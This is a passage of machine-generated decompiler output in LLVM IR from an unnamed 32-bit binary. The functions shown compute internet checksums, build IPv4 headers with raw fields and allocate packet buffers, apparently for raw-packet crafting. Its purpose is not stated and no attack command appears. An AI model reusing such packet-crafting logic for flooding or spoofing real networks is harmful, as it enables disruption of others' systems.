  br i1 %v10_8049e52, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e62

dec_label_pc_8049e62:                             ; preds = %dec_label_pc_8049e4e, %dec_label_pc_8049e46
  %v10_8049e66 = icmp eq i8 %stack_var_-15.0.in, 88
  %v1_8049e68 = icmp eq i1 %v10_8049e66, false
  br i1 %v1_8049e68, label %dec_label_pc_8049e7e, label %dec_label_pc_8049e6a

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049e62
  %v4_8049e6a23 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049e6a23, i32* @eax, align 4
  %v10_8049e6e = icmp eq i8 %stack_var_-14.0.in, 99
  br i1 %v10_8049e6e, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e7e

dec_label_pc_8049e76:                             ; preds = %dec_label_pc_8049e3e
  br label %dec_label_pc_8049e8a

dec_label_pc_8049e7e:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e62
  store i32 %v4_8049e4620, i32* @eax, align 4
  %v11_8049e82 = icmp eq i8 %stack_var_-15.0.in, -88
  br i1 %v11_8049e82, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e8a

dec_label_pc_8049e8a:                             ; preds = %dec_label_pc_8049e76, %dec_label_pc_8049e7e
  %v11_8049e8e = icmp eq i8 %v3_8049dd2, -58
  %v1_8049e90 = icmp eq i1 %v11_8049e8e, false
  br i1 %v1_8049e90, label %dec_label_pc_8049eaa.thread, label %dec_label_pc_8049e92

dec_label_pc_8049eaa.thread:                      ; preds = %dec_label_pc_8049e8a
  br label %dec_label_pc_8049ec6

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e8a
  %v4_8049e9225 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049e9225, i32* @eax, align 4
  %v10_8049e96 = icmp eq i8 %stack_var_-15.0.in, 18
  br i1 %v10_8049e96, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e9e

dec_label_pc_8049e9e:                             ; preds = %dec_label_pc_8049e92
  store i32 %v4_8049e9225, i32* @eax, align 4
  %v10_8049ea2 = icmp eq i8 %stack_var_-15.0.in, 19
  br i1 %v10_8049ea2, label %dec_label_pc_8049cd0, label %dec_label_pc_8049eb2

dec_label_pc_8049eb2:                             ; preds = %dec_label_pc_8049e9e
  %v10_8049eb6 = icmp eq i8 %stack_var_-15.0.in, 51
  %v1_8049eb8 = icmp eq i1 %v10_8049eb6, false
  br i1 %v1_8049eb8, label %dec_label_pc_8049ec6, label %dec_label_pc_8049eba

dec_label_pc_8049eba:                             ; preds = %dec_label_pc_8049eb2
  %v4_8049eba28 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049eba28, i32* @eax, align 4
  %v10_8049ebe = icmp eq i8 %stack_var_-14.0.in, 100
  br i1 %v10_8049ebe, label %dec_label_pc_8049cd0, label %dec_label_pc_8049ec6

dec_label_pc_8049ec6:                             ; preds = %dec_label_pc_8049eaa.thread, %dec_label_pc_8049eba, %dec_label_pc_8049eb2
  %v11_8049eca = icmp eq i8 %v3_8049dd2, -53
  %v1_8049ecc = icmp eq i1 %v11_8049eca, false
  br i1 %v1_8049ecc, label %dec_label_pc_8049ee2, label %dec_label_pc_8049ece

dec_label_pc_8049ece:                             ; preds = %dec_label_pc_8049ec6
  %v4_8049ed2 = icmp eq i8 %stack_var_-15.0.in, 0
  %v1_8049ed4 = icmp eq i1 %v4_8049ed2, false
  br i1 %v1_8049ed4, label %dec_label_pc_8049ee2, label %dec_label_pc_8049ed6

dec_label_pc_8049ed6:                             ; preds = %dec_label_pc_8049ece
  %v4_8049ed630 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049ed630, i32* @eax, align 4
  %v10_8049eda = icmp eq i8 %stack_var_-14.0.in, 113
  br i1 %v10_8049eda, label %dec_label_pc_8049cd0, label %dec_label_pc_8049ee2

dec_label_pc_8049ee2:                             ; preds = %dec_label_pc_8049ed6, %dec_label_pc_8049ece, %dec_label_pc_8049ec6
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %tmp75 = icmp ult i8 %v3_8049dd2, -32
  br i1 %tmp75, label %dec_label_pc_8049eee, label %dec_label_pc_8049cd0

dec_label_pc_8049eee:                             ; preds = %dec_label_pc_8049ee2
  store i32 0, i32* %stack_var_-32, align 4
  %v4_8049f0a32 = urem i32 %storemerge37.in, 256
  store i32 %v4_8049f0a32, i32* @edx, align 4
  %v4_8049f1134 = urem i32 %stack_var_-14.0.in.in, 256
  %v4_8049f1835 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049f1835, i32* @ebx, align 4
  %v1_8049f23 = urem i32 %stack_var_-16.0.in, 256
  %v2_8049f26 = ptrtoint i32* %stack_var_-32 to i32
  %v7_8049f44 = call i32 @function_8048933(i32 %v2_8049f26, i32 ptrtoint ([12 x i8]* @global_var_8052e63.30 to i32), i32 %v1_8049f23, i32 %v4_8049f1835, i32 %v4_8049f1134, i32 %v4_8049f0a32)
  %v1_8049f4f = call i32 @function_804fa24(i32 %v2_8049f26)
  %v2_8049f57 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049f57, i32* @ebx, align 4
  store i32 %v0_8049bc1, i32* @esi, align 4
  ret i32 %v1_8049f4f

; uselistorder directives
  uselistorder i32 %v4_8049f1835, { 1, 0 }
  uselistorder i32 %v4_8049f0a32, { 1, 0 }
  uselistorder i32 %v4_8049e9225, { 1, 0 }
  uselistorder i8 %stack_var_-15.0.in, { 10, 2, 3, 4, 0, 5, 9, 6, 1, 8, 7 }
  uselistorder i32 %v2_8049d84, { 1, 0 }
  uselistorder i32 %v2_8049d46, { 1, 0 }
  uselistorder i32 %v2_8049d08, { 1, 0 }
  uselistorder i32 %v2_8049c81, { 1, 0 }
  uselistorder i32 %v2_8049c43, { 1, 0 }
  uselistorder i32 %v2_8049c05, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 (i32)* @function_804fa24, { 1, 0 }
  uselistorder i32 (i32)* @function_8050a20, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049ec6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049e8a, { 1, 0 }
  uselistorder label %dec_label_pc_8049dce, { 1, 0 }
  uselistorder label %dec_label_pc_8049cd0, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
}

define i32 @function_8049f5b(i32 %arg1) local_unnamed_addr {
dec_label_pc_8049f5b:
  %v0_8049f61 = load i32, i32* @global_var_805b980.31, align 128
  %v1_8049f69 = call i32 @function_804f9b9(i32 %v0_8049f61)
  %v5_8049f6e = and i32 %v1_8049f69, %arg1
  %v1_8049f74 = call i32 @function_804829b(i32 %v5_8049f6e)
  %v1_8049f7e = sub i32 -1, %arg1
  %v2_8049f80 = and i32 %v1_8049f74, %v1_8049f7e
  %v5_8049f82 = xor i32 %v2_8049f80, %v5_8049f6e
  ret i32 %v5_8049f82
}

define i32 @function_8049f87(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049f87:
  %v4_8049fbb3 = add i32 %arg2, -1
  %v9_8049fbb5 = sub i32 0, %arg2
  %v10_8049fbb6 = and i32 %arg2, %v9_8049fbb5
  %v11_8049fbb7 = icmp slt i32 %v10_8049fbb6, 0
  %v12_8049fbb8 = icmp eq i32 %v4_8049fbb3, 0
  %v13_8049fbb9 = icmp slt i32 %v4_8049fbb3, 0
  %v3_8049fbf10 = icmp eq i1 %v13_8049fbb9, %v11_8049fbb7
  %v4_8049fbf11 = icmp eq i1 %v12_8049fbb8, false
  %v5_8049fbf12 = and i1 %v4_8049fbf11, %v3_8049fbf10
  br i1 %v5_8049fbf12, label %dec_label_pc_8049fa0, label %dec_label_pc_8049fc1

dec_label_pc_8049fa0:                             ; preds = %dec_label_pc_8049f87, %dec_label_pc_8049fa0
  %v3_8049fad = phi i32 [ %v6_8049fad, %dec_label_pc_8049fa0 ], [ 0, %dec_label_pc_8049f87 ]
  %stack_var_-24.015 = phi i32 [ %v9_8049fb0, %dec_label_pc_8049fa0 ], [ 0, %dec_label_pc_8049f87 ]
  %stack_var_8.014 = phi i32 [ %v4_8049fb7, %dec_label_pc_8049fa0 ], [ %arg2, %dec_label_pc_8049f87 ]
  %stack_var_4.013 = phi i16* [ %v23_8049fb3, %dec_label_pc_8049fa0 ], [ %arg1, %dec_label_pc_8049f87 ]
  %v4_8049fa0 = ptrtoint i16* %stack_var_4.013 to i32
  %v2_8049fa3 = load i16, i16* %stack_var_4.013, align 2
  %v3_8049fa3 = zext i16 %v2_8049fa3 to i32
  %sext27 = mul i32 %v3_8049fad, 65536
  %v4_8049fad = sdiv i32 %sext27, 65536
  %v6_8049fad = add nsw i32 %v3_8049fa3, %v4_8049fad
  %v11_8049fad = icmp ult i32 %v6_8049fad, %v4_8049fad
  %sext = mul i32 %stack_var_-24.015, 65536
  %v4_8049fb0 = sdiv i32 %sext, 65536
  %v7_8049fb0 = zext i1 %v11_8049fad to i32
  %v9_8049fb0 = add nsw i32 %v7_8049fb0, %v4_8049fb0
  %v5_8049fb3 = add i32 %v4_8049fa0, 2
  %v23_8049fb3 = inttoptr i32 %v5_8049fb3 to i16*
  %v4_8049fb7 = add i32 %stack_var_8.014, -2
  %v4_8049fbb = add i32 %stack_var_8.014, -3
  %v9_8049fbb = sub i32 2, %stack_var_8.014
  %v10_8049fbb = and i32 %v4_8049fb7, %v9_8049fbb
  %v11_8049fbb = icmp slt i32 %v10_8049fbb, 0
  %v12_8049fbb = icmp eq i32 %v4_8049fbb, 0
  %v13_8049fbb = icmp slt i32 %v4_8049fbb, 0
  %v3_8049fbf = icmp eq i1 %v13_8049fbb, %v11_8049fbb
  %v4_8049fbf = icmp eq i1 %v12_8049fbb, false
  %v5_8049fbf = and i1 %v4_8049fbf, %v3_8049fbf
  br i1 %v5_8049fbf, label %dec_label_pc_8049fa0, label %dec_label_pc_8049fbb.dec_label_pc_8049fc1_crit_edge

dec_label_pc_8049fbb.dec_label_pc_8049fc1_crit_edge: ; preds = %dec_label_pc_8049fa0
  %v26_8049fad = trunc i32 %v6_8049fad to i16
  %v35_8049fb0 = trunc i32 %v9_8049fb0 to i16
  br label %dec_label_pc_8049fc1

dec_label_pc_8049fc1:                             ; preds = %dec_label_pc_8049fbb.dec_label_pc_8049fc1_crit_edge, %dec_label_pc_8049f87
  %v3_8049fd5 = phi i16 [ %v26_8049fad, %dec_label_pc_8049fbb.dec_label_pc_8049fc1_crit_edge ], [ 0, %dec_label_pc_8049f87 ]
  %stack_var_4.0.lcssa = phi i16* [ %v23_8049fb3, %dec_label_pc_8049fbb.dec_label_pc_8049fc1_crit_edge ], [ %arg1, %dec_label_pc_8049f87 ]
  %stack_var_8.0.lcssa = phi i32 [ %v4_8049fb7, %dec_label_pc_8049fbb.dec_label_pc_8049fc1_crit_edge ], [ %arg2, %dec_label_pc_8049f87 ]
  %stack_var_-24.0.lcssa = phi i16 [ %v35_8049fb0, %dec_label_pc_8049fbb.dec_label_pc_8049fc1_crit_edge ], [ 0, %dec_label_pc_8049f87 ]
  %tmp36 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp36, label %dec_label_pc_804a002.preheader, label %dec_label_pc_8049fc7

dec_label_pc_8049fc7:                             ; preds = %dec_label_pc_8049fc1
  %v1_8049fca = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_8049fca = load i8, i8* %v1_8049fca, align 1
  %v3_8049fca = zext i8 %v2_8049fca to i32
  %v4_8049fd5 = sext i16 %v3_8049fd5 to i32
  %v6_8049fd5 = add nsw i32 %v3_8049fca, %v4_8049fd5
  %v11_8049fd5 = icmp ult i32 %v6_8049fd5, %v4_8049fd5
  %v26_8049fd5 = trunc i32 %v6_8049fd5 to i16
  %v7_8049fd8 = zext i1 %v11_8049fd5 to i16
  %v9_8049fd8 = add i16 %v7_8049fd8, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804a002.preheader

dec_label_pc_804a002.preheader:                   ; preds = %dec_label_pc_8049fc7, %dec_label_pc_8049fc1
  %v3_8049fe7.ph = phi i16 [ %v3_8049fd5, %dec_label_pc_8049fc1 ], [ %v26_8049fd5, %dec_label_pc_8049fc7 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_8049fc1 ], [ %v9_8049fd8, %dec_label_pc_8049fc7 ]
  %v4_804a00238 = sext i16 %v3_8049fe7.ph to i32
  %v4_804a00539 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804a00840 = udiv i32 %v4_804a00238, 65536
  %v4_804a00841 = mul i32 %v4_804a00539, 65536
  %v5_804a00842 = or i32 %v4_804a00841, %v3_804a00840
  %v2_804a00c43 = udiv i32 %v4_804a00539, 65536
  %v2_804a00f44 = or i32 %v5_804a00842, %v2_804a00c43
  %v3_804a00f45 = icmp eq i32 %v2_804a00f44, 0
  %v1_804a01346 = icmp eq i1 %v3_804a00f45, false
  br i1 %v1_804a01346, label %dec_label_pc_8049fdd, label %dec_label_pc_804a015

dec_label_pc_8049fdd:                             ; preds = %dec_label_pc_804a002.preheader, %dec_label_pc_8049fdd
  %v2_804a00c49 = phi i32 [ %v2_804a00c, %dec_label_pc_8049fdd ], [ %v2_804a00c43, %dec_label_pc_804a002.preheader ]
  %v5_804a00848 = phi i32 [ %v5_804a008, %dec_label_pc_8049fdd ], [ %v5_804a00842, %dec_label_pc_804a002.preheader ]
  %v4_804a00247 = phi i32 [ %v4_804a002, %dec_label_pc_8049fdd ], [ %v4_804a00238, %dec_label_pc_804a002.preheader ]
  %v2_8049ff8 = add i32 %v5_804a00848, %v4_804a00247
  %v7_8049ff8 = icmp ult i32 %v2_8049ff8, %v4_804a00247
  %v3_8049ffa = zext i1 %v7_8049ff8 to i32
  %v5_8049ffa = add nuw nsw i32 %v3_8049ffa, %v2_804a00c49
  %sext51 = mul i32 %v2_8049ff8, 65536
  %v4_804a002 = sdiv i32 %sext51, 65536
  %sext52 = mul i32 %v5_8049ffa, 65536
  %v4_804a005 = sdiv i32 %sext52, 65536
  %v3_804a008 = udiv i32 %v4_804a002, 65536
  %v5_804a008 = or i32 %sext52, %v3_804a008
  %v2_804a00c = udiv i32 %v4_804a005, 65536
  %v2_804a00f = or i32 %v5_804a008, %v2_804a00c
  %v3_804a00f = icmp eq i32 %v2_804a00f, 0
  %v1_804a013 = icmp eq i1 %v3_804a00f, false
  br i1 %v1_804a013, label %dec_label_pc_8049fdd, label %dec_label_pc_804a002.dec_label_pc_804a015_crit_edge

dec_label_pc_804a002.dec_label_pc_804a015_crit_edge: ; preds = %dec_label_pc_8049fdd
  br label %dec_label_pc_804a015

dec_label_pc_804a015:                             ; preds = %dec_label_pc_804a002.dec_label_pc_804a015_crit_edge, %dec_label_pc_804a002.preheader
  %v4_804a002.lcssa = phi i32 [ %v4_804a002, %dec_label_pc_804a002.dec_label_pc_804a015_crit_edge ], [ %v4_804a00238, %dec_label_pc_804a002.preheader ]
  %v1_804a019 = urem i32 %v4_804a002.lcssa, 65536
  %v1_804a01b = xor i32 %v1_804a019, 65535
  ret i32 %v1_804a01b

; uselistorder directives
  uselistorder i32 %v5_804a008, { 1, 0 }
  uselistorder i32 %v4_804a002, { 1, 0, 2 }
  uselistorder i32 %v2_804a00c43, { 1, 0 }
  uselistorder i32 %v4_804a00539, { 1, 0 }
  uselistorder i32 %v4_804a00238, { 2, 1, 0 }
  uselistorder i32 %v4_8049fd5, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_8049fbb, { 1, 0 }
  uselistorder i32 %v4_8049fb7, { 0, 2, 1 }
  uselistorder i32 %v6_8049fad, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049fdd, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa0, { 1, 0 }
}

define i32 @function_804a026(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804a026:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804a026 = load i32, i32* @ebp, align 4
  store i32 %v0_804a026, i32* %stack_var_-4, align 4
  %v4_804a026 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a026, i32* @ebp, align 4
  %v1_804a03a = add i32 %arg1, 12
  %v2_804a03a = inttoptr i32 %v1_804a03a to i32*
  %v3_804a03a = load i32, i32* %v2_804a03a, align 4
  %v1_804a043 = add i32 %arg1, 16
  %v2_804a043 = inttoptr i32 %v1_804a043 to i32*
  %v3_804a043 = load i32, i32* %v2_804a043, align 4
  %v2_804a058 = call i32 @function_804f998(i16 20)
  %v1_804a071 = call i32 @function_804fd76(i32 32)
  store i32 %v1_804a071, i32* %ecx.global-to-local, align 4
  %v2_804a081 = inttoptr i32 %v1_804a071 to i32*
  store i32 %v3_804a03a, i32* %v2_804a081, align 4
  %v1_804a086 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a086 = add i32 %v1_804a086, 4
  %v3_804a086 = inttoptr i32 %v2_804a086 to i32*
  store i32 %v3_804a043, i32* %v3_804a086, align 4
  %v1_804a08c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a08c = add i32 %v1_804a08c, 8
  %v3_804a08c = inttoptr i32 %v2_804a08c to i32*
  store i32 0, i32* %v3_804a08c, align 4
  store i32 %tmp3, i32* %ecx.global-to-local, align 4
  %v1_804a095 = add i32 %v1_804a071, 12
  store i32 %v1_804a095, i32* %edx.global-to-local, align 4
  %v2_804a098 = load i32, i32* %arg2, align 4
  %v2_804a09a = inttoptr i32 %v1_804a095 to i32*
  store i32 %v2_804a098, i32* %v2_804a09a, align 4
  %v0_804a09c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a09c = add i32 %v0_804a09c, 4
  %v2_804a09c = inttoptr i32 %v1_804a09c to i32*
  %v3_804a09c = load i32, i32* %v2_804a09c, align 4
  %v1_804a09f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a09f = add i32 %v1_804a09f, 4
  %v3_804a09f = inttoptr i32 %v2_804a09f to i32*
  store i32 %v3_804a09c, i32* %v3_804a09f, align 4
  %v0_804a0a2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0a2 = add i32 %v0_804a0a2, 8
  %v2_804a0a2 = inttoptr i32 %v1_804a0a2 to i32*
  %v3_804a0a2 = load i32, i32* %v2_804a0a2, align 4
  %v1_804a0a5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0a5 = add i32 %v1_804a0a5, 8
  %v3_804a0a5 = inttoptr i32 %v2_804a0a5 to i32*
  store i32 %v3_804a0a2, i32* %v3_804a0a5, align 4
  %v0_804a0a8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0a8 = add i32 %v0_804a0a8, 12
  %v2_804a0a8 = inttoptr i32 %v1_804a0a8 to i32*
  %v3_804a0a8 = load i32, i32* %v2_804a0a8, align 4
  %v1_804a0ab = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0ab = add i32 %v1_804a0ab, 12
  %v3_804a0ab = inttoptr i32 %v2_804a0ab to i32*
  store i32 %v3_804a0a8, i32* %v3_804a0ab, align 4
  %v0_804a0ae = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0ae = add i32 %v0_804a0ae, 16
  %v2_804a0ae = inttoptr i32 %v1_804a0ae to i32*
  %v3_804a0ae = load i32, i32* %v2_804a0ae, align 4
  %v1_804a0b1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0b1 = add i32 %v1_804a0b1, 16
  %v3_804a0b1 = inttoptr i32 %v2_804a0b1 to i32*
  store i32 %v3_804a0ae, i32* %v3_804a0b1, align 4
  %v2_804a0c1 = inttoptr i32 %v1_804a071 to i16*
  %v3_804a0c1 = call i32 @function_8049f87(i16* %v2_804a0c1, i32 32)
  %v1_804a0c6 = urem i32 %v3_804a0c1, 65536
  %v1_804a0d3 = call i32 @function_805074d(i32 %v1_804a071)
  ret i32 %v1_804a0c6

; uselistorder directives
  uselistorder i32 %v1_804a071, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804a0de(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804a0de:
  %tmp10 = trunc i32 %arg4 to i8
  %sext = mul i32 %arg4, 16777216
  %v4_804a0e4 = sdiv i32 %sext, 16777216
  %v4_804a0ea = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804a105 = add i32 %v4_804a0ea, 1
  %v2_804a105 = inttoptr i32 %v1_804a105 to i8*
  store i8 0, i8* %v2_804a105, align 1
  %fold = add i32 %arg5, 20
  %v1_804a118 = trunc i32 %fold to i16
  %v3_804a118 = add i32 %v4_804a0ea, 2
  %v4_804a118 = inttoptr i32 %v3_804a118 to i16*
  store i16 %v1_804a118, i16* %v4_804a118, align 2
  %v2_804a11c = call i32 @function_804829b(i32 %v4_804a0e4)
  %v1_804a127 = trunc i32 %v2_804a11c to i16
  %v3_804a127 = add i32 %v4_804a0ea, 4
  %v4_804a127 = inttoptr i32 %v3_804a127 to i16*
  store i16 %v1_804a127, i16* %v4_804a127, align 2
  %v1_804a12e = add i32 %v4_804a0ea, 6
  %v2_804a12e = inttoptr i32 %v1_804a12e to i16*
  store i16 0, i16* %v2_804a12e, align 2
  %v1_804a137 = add i32 %v4_804a0ea, 8
  %v2_804a137 = inttoptr i32 %v1_804a137 to i8*
  store i8 -1, i8* %v2_804a137, align 1
  %v3_804a142 = add i32 %v4_804a0ea, 9
  %v4_804a142 = inttoptr i32 %v3_804a142 to i8*
  store i8 %tmp10, i8* %v4_804a142, align 1
  %v1_804a148 = add i32 %v4_804a0ea, 10
  %v2_804a148 = inttoptr i32 %v1_804a148 to i16*
  store i16 0, i16* %v2_804a148, align 2
  %v2_804a154 = add i32 %v4_804a0ea, 12
  %v3_804a154 = inttoptr i32 %v2_804a154 to i32*
  store i32 %arg3, i32* %v3_804a154, align 4
  %v2_804a15d = add i32 %v4_804a0ea, 16
  %v3_804a15d = inttoptr i32 %v2_804a15d to i32*
  store i32 %arg2, i32* %v3_804a15d, align 4
  ret i32 %arg2

; uselistorder directives
  uselistorder i8 -1, { 3, 0, 2, 1 }
  uselistorder i32 (i32)* @function_804829b, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_804a162(i32 %arg1) local_unnamed_addr {
dec_label_pc_804a162:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a162 = load i32, i32* @ebp, align 4
  store i32 %v0_804a162, i32* %stack_var_-4, align 4
  %v4_804a168 = add i32 %arg1, -2
  %v9_804a168 = sub i32 1, %arg1
  %v10_804a168 = and i32 %v9_804a168, %arg1
  %v11_804a168 = icmp slt i32 %v10_804a168, 0
  %v12_804a168 = icmp eq i32 %v4_804a168, 0
  %v13_804a168 = icmp slt i32 %v4_804a168, 0
  %v3_804a16c = icmp eq i1 %v13_804a168, %v11_804a168
  %v4_804a16c = icmp eq i1 %v12_804a168, false
  %v5_804a16c = and i1 %v4_804a16c, %v3_804a16c
  br i1 %v5_804a16c, label %dec_label_pc_804a177, label %dec_label_pc_804a189

dec_label_pc_804a177:                             ; preds = %dec_label_pc_804a162
  %v1_804a17d = call i32 @function_804e2cc(i32 %arg1)
  %v2_804a18c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804a189

dec_label_pc_804a189:                             ; preds = %dec_label_pc_804a162, %dec_label_pc_804a177
  %v2_804a18c = phi i32 [ %v2_804a18c.pre, %dec_label_pc_804a177 ], [ %v0_804a162, %dec_label_pc_804a162 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804a177 ], [ 1, %dec_label_pc_804a162 ]
  store i32 %v2_804a18c, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804a168, { 1, 0 }
  uselistorder i32 (i32)* @function_804e2cc, { 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a189, { 1, 0 }
}

define i32 @function_804a18e() local_unnamed_addr {
dec_label_pc_804a18e:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp52 = call i8* @__decompiler_undefined_function_1()
  %tmp53 = call i8* @__decompiler_undefined_function_1()
  %tmp54 = call i8* @__decompiler_undefined_function_1()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i32 @__decompiler_undefined_function_0()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %v0_804a191 = load i32, i32* @edi, align 4
  %v0_804a192 = load i32, i32* @esi, align 4
  %v0_804a193 = load i32, i32* @ebx, align 4
  %v3_804a19a = call i32 @function_804e358(i32 %v0_804a193, i32 %v0_804a192, i32 %v0_804a191)
  %v2_804a1a3 = ashr i32 %v3_804a19a, 31
  %v2_804a1a6 = udiv i32 %v2_804a1a3, 1073741824
  %v2_804a1a9 = add i32 %v2_804a1a6, %v3_804a19a
  %v2_804a1ab = sdiv i32 %v2_804a1a9, 4
  %v2_804a1b4 = mul nsw i32 %v2_804a1ab, 3
  store i32 %v2_804a1b4, i32* %eax.global-to-local, align 4
  %v7_804a1cc = icmp sgt i32 %v2_804a1b4, 512
  %.v2_804a1b4 = select i1 %v7_804a1cc, i32 512, i32 %v2_804a1b4
  store i32 %.v2_804a1b4, i32* %edx.global-to-local, align 4
  store i32 2, i32* %stack_var_-204, align 4
  %v2_804a1f1 = call i32 @function_804f998(i16 23)
  %v2_804a200 = ptrtoint i32* %stack_var_-204 to i32
  %v2_804a221 = mul i32 %.v2_804a1b4, 24
  %v1_804a227 = add i32 %v2_804a221, 30
  %v2_804a22a = and i32 %v1_804a227, -16
  %v0_804a230 = load i32, i32* @esp, align 4
  %v2_804a230 = sub i32 %v0_804a230, %v2_804a22a
  %v1_804a242 = add i32 %v2_804a230, 47
  %v2_804a245 = and i32 %v1_804a242, -16
  %v2_804a262 = mul i32 %.v2_804a1b4, 5
  store i32 %v2_804a262, i32* %edx.global-to-local, align 4
  %v1_804a268 = inttoptr i32 %v2_804a245 to i8*
  store i32 %v2_804a245, i32* @edi, align 4
  %v1_804a26d = and i32 %v1_804a242, -256
  store i32 %v1_804a26d, i32* %eax.global-to-local, align 4
  %v5_804a26f = call i8* @_memset(i8* %v1_804a268, i32 %v1_804a26d, i32 %v2_804a262)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a2ec47 = icmp sgt i32 %v2_804a1a9, 3
  %v2_804a289 = or i32 %v2_804a245, 9
  br i1 %v5_804a2ec47, label %dec_label_pc_804a27a.preheader, label %dec_label_pc_804a2ee.preheader

dec_label_pc_804a27a.preheader:                   ; preds = %dec_label_pc_804a18e
  %v2_804a2ab = add i32 %v2_804a245, 20
  br label %dec_label_pc_804a27a

dec_label_pc_804a27a:                             ; preds = %dec_label_pc_804a27a.preheader, %dec_label_pc_804a27a
  %storemerge548 = phi i32 [ %v4_804a2e3, %dec_label_pc_804a27a ], [ 0, %dec_label_pc_804a27a.preheader ]
  store i32 %storemerge548, i32* %edx.global-to-local, align 4
  %v2_804a286 = mul nuw nsw i32 %storemerge548, 24
  store i32 %v2_804a286, i32* %eax.global-to-local, align 4
  %v3_804a289 = add i32 %v2_804a289, %v2_804a286
  %v4_804a289 = inttoptr i32 %v3_804a289 to i8*
  store i8 1, i8* %v4_804a289, align 1
  store i32 %storemerge548, i32* @ebx, align 4
  %v0_804a291 = load i32, i32* @esp, align 4
  %v1_804a291 = inttoptr i32 %v0_804a291 to i32*
  store i32 1024, i32* %v1_804a291, align 4
  %v1_804a298 = call i32 @function_804fd76(i32 %storemerge548)
  %v0_804a2a2 = load i32, i32* @ebx, align 4
  %v2_804a2a8 = mul i32 %v0_804a2a2, 24
  %v1_804a2ad = add i32 %v2_804a2ab, %v2_804a2a8
  %v2_804a2b0 = inttoptr i32 %v1_804a2ad to i32*
  store i32 %v1_804a298, i32* %v2_804a2b0, align 4
  store i32 %storemerge548, i32* %edx.global-to-local, align 4
  %v2_804a2c1 = add i32 %v2_804a286, %v2_804a245
  %v1_804a2c3 = add i32 %v2_804a2c1, 20
  store i32 %v1_804a2c3, i32* %eax.global-to-local, align 4
  %v1_804a2c6 = inttoptr i32 %v1_804a2c3 to i32*
  %v2_804a2c6 = load i32, i32* %v1_804a2c6, align 4
  store i32 %v2_804a2c6, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804a2cf = load i32, i32* @esp, align 4
  %v2_804a2cf = add i32 %v1_804a2cf, 8
  %v3_804a2cf = inttoptr i32 %v2_804a2cf to i32*
  store i32 1024, i32* %v3_804a2cf, align 4
  %v0_804a2d3 = load i32, i32* @esp, align 4
  %v1_804a2d3 = add i32 %v0_804a2d3, 4
